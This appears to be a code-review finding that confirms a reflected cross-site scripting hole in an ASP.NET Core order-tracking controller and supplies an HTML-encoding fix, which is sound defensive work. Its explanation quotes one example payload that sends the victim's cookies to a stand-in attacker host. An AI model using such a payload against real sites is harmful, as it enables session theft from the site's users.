## Verdict
Confirmed. `orderId` and `customerNote` come from `Request.Query` and are concatenated directly into an HTML string that is returned via `Content(html, "text/html")` with no encoding, allowing reflected script injection through either query parameter.

## Source
`Request.Query["orderId"]` and `Request.Query["note"]` (lines 10-11) - both are attacker-controlled query string values read from the incoming HTTP request.

## Fix

```csharp
using System.Net;
using Microsoft.AspNetCore.Mvc;

namespace OrderPortal.Controllers
{
    public class TrackingController : Controller
    {
        [HttpGet("/tracking/confirm")]
        public IActionResult Confirm()
        {
            string orderId = Request.Query["orderId"];
            string customerNote = Request.Query["note"];

            string html = "<html><body>" +
                "<h2>Tracking Confirmation</h2>" +
                "<p>Order: " + WebUtility.HtmlEncode(orderId) + "</p>" +
                "<p>Note from customer: " + WebUtility.HtmlEncode(customerNote) + "</p>" +
                "</body></html>";

            return Content(html, "text/html");
        }
    }
}
```

## Explanation
The handler builds a raw HTML document via string concatenation and hands it back through `Content(..., "text/html")`, which performs no output encoding - unlike a Razor `.cshtml` view, where `@model` expressions are HTML-encoded by default and only `Html.Raw()` would bypass that. Because this path builds the markup manually and serves it as a raw content result, both `orderId` and `customerNote` reach the response byte-for-byte, so a value such as `<script>document.location='https://evil.example/steal?c='+document.cookie</script>` in either parameter executes in the victim's browser in the site's origin.

The fix HTML-encodes each value at the point it is concatenated into the markup, using `System.Net.WebUtility.HtmlEncode` (built into the BCL, no extra package needed), which converts `<`, `>`, `&`, and quote characters into their HTML entity equivalents so any injected markup renders as inert text. Encoding must be applied to every interpolated value individually, at the point of output, rather than attempting to sanitize the inputs once and reuse them elsewhere - `orderId` and `customerNote` may still be used unencoded in other contexts (logging, database lookups) where HTML encoding is not the correct transform.

Where feasible, prefer converting this action to a Razor view (`return View(model)`) so encoding is applied automatically and consistently by the framework rather than relying on manual encoding at every concatenation site, which is easy to miss on future edits to this handler.
